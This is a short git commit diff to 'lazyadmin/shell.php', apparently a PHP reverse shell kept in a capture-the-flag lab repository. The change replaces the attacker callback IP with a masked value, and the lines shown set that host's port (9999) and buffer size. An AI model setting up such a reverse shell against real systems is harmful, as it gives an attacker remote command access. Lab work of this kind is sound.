8e35ddd9ba1be2e3a7724231268d3a91bd57440e
kevin_pro <35914036+vendetta546@users.noreply.github.com>
2021-02-28 10:20:28 +0530

    Update shell.php

--- lazyadmin/shell.php
+++ lazyadmin/shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.8.1.147';  // CHANGE THIS
+$ip = '10.*.*.*';  // CHANGE THIS
 $port = 9999;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
